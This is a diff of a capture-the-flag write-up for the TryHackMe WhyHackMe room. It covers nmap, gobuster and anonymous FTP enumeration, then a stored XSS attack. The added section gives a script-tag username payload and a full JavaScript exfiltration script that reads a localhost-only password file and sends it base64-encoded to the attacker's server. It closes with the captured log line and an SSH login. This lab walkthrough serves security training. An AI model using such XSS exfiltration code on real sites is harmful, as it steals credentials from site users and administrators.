@@ -16,13 +16,13 @@ Hi I'm making [TryHackMe WhyHackMe](https://tryhackme.com/room/whyhackme) room.
 ---
 
 ```bash
-IP=10.10.168.55
+IP=10.10.157.184
 ```
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
 Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-10 14:00 +0300
-Nmap scan report for 10.10.168.55
+Nmap scan report for 10.10.157.184
 Host is up (0.070s latency).
 Not shown: 65531 closed tcp ports (conn-refused)
 PORT      STATE    SERVICE VERSION
@@ -75,7 +75,7 @@ admin admin didn't worked lets firstly fuzz the website using `gobuster`.
 Gobuster v3.7
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.168.55/
+[+] Url:                     http://10.10.157.184/
 [+] Method:                  GET
 [+] Threads:                 50
 [+] Wordlist:                common.txt
@@ -86,7 +86,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/assets               (Status: 301) [Size: 313] [--> http://10.10.168.55/assets/]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.157.184/assets/]
 /blog.php             (Status: 200) [Size: 3102]
 /cgi-bin/             (Status: 403) [Size: 277]
 /config.php           (Status: 200) [Size: 0]
@@ -115,10 +115,10 @@ Maybe we can try to exploit that.
 Firstly lets log in Anonymous on ftp.
 
 ```bash
-root@e3769c930fc5:/data# ftp 10.10.168.55 21
-Connected to 10.10.168.55.
+root@e3769c930fc5:/data# ftp 10.10.157.184 21
+Connected to 10.10.157.184.
 220 (vsFTPd 3.0.3)
-Name (10.10.168.55:root): anonymous
+Name (10.10.157.184:root): anonymous
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -148,4 +148,154 @@ ftp> get update.txt
 ❯ cat update.txt
 Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
 - admin
+```
+
+Now lets continue trying to xss vuln.
+
+![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo4.webp){: width="972" height="589" }
+
+It looks like this is not working lets try creating a user named xss vuln.
+
+And It works.
+
+![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo5.webp){: width="972" height="589" }
+
+Now lets use this vuln to get the /dir/pass.txt
+
+Now firstly open a username named
+
+`<script src="http://10.21.206.128/pwn.js"></script>`
+
+Here is the code I used:
+
+[TrustedSec | Simple Data Exfiltration Through XSS](https://trustedsec.com/blog/simple-data-exfiltration-through-xss)
+
+```javascript
+// TrustedSec Proof-of-Concept to steal
+// sensitive data through XSS payload
+function read_body(xhr) {
+  var data;
+  if (!xhr.responseType || xhr.responseType === "text") {
+    data = xhr.responseText;
+  } else if (xhr.responseType === "document") {
+    data = xhr.responseXML;
+  } else if (xhr.responseType === "json") {
+    data = xhr.responseJSON;
+  } else {
+    data = xhr.response;
+  }
+  return data;
+}
+
+function stealData() {
+  var uri = "/dir/pass.txt";
+
+  xhr = new XMLHttpRequest();
+  xhr.open("GET", uri, true);
+  xhr.send(null);
+
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+      // We have the response back with the data
+      var dataResponse = read_body(xhr);
+
+      // Time to exfiltrate the HTML response with the data
+      var exfilChunkSize = 2000;
+      var exfilData = btoa(dataResponse);
+      var numFullChunks = (exfilData.length / exfilChunkSize) | 0;
+      var remainderBits = exfilData.length % exfilChunkSize;
+
+      // Exfil the yummies
+      for (i = 0; i < numFullChunks; i++) {
+        console.log("Loop is: " + i);
+
+        var exfilChunk = exfilData.slice(
+          exfilChunkSize * i,
+          exfilChunkSize * (i + 1)
+        );
+
+        // Let's use an external image load to get our data out
+        // The file name we request will be the data we're exfiltrating
+        var downloadImage = new Image();
+        downloadImage.onload = function () {
+          image.src = this.src;
+        };
+
+        // Try to async load the image, whose name is the string of data
+        downloadImage.src =
+          "http://10.21.206.128/exfil/" + i + "/" + exfilChunk + ".jpg";
+      }
+
+      // Now grab that last bit
+      var exfilChunk = exfilData.slice(
+        exfilChunkSize * numFullChunks,
+        exfilChunkSize * numFullChunks + remainderBits
+      );
+      var downloadImage = new Image();
+      downloadImage.onload = function () {
+        image.src = this.src;
+      };
+
+      downloadImage.src =
+        "http://10.21.206.128/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
+      console.log("Done exfiling chunks..");
+    }
+  };
+}
+
+stealData();
+```
+
+Now serve this code using a webserver.
+
+```bash
+❯ sudo python -m http.server 80
+```
+And you'll get the password base64 encoded after sending a new comment.
+
+
+```text
+10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /pwn.js HTTP/1.1" 200 -
+10.10.157.184 - - [10/Jul/2025 15:30:03] code 404, message File not found
+10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /exfil/LAST/**************GFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg HTTP/1.1" 404 -
+```
+
+decode the base64 and you'll get the jacks password
+
+use that password to log in with ssh as jack.
+```bash
+❯ ssh jack@$IP                 
+The authenticity of host '10.10.157.184 (10.10.157.184)' can't be established.
+ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.157.184' (ED25519) to the list of known hosts.
+jack@10.10.157.184's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 10 Jul 2025 12:33:12 PM UTC
+
+  System load:  0.0                Processes:             130
+  Usage of /:   79.7% of 11.21GB   Users logged in:       0
+  Memory usage: 32%                IPv4 address for eth0: 10.10.157.184
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+64 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Jan 29 13:44:19 2024
+jack@ubuntu:~$ 
 ```
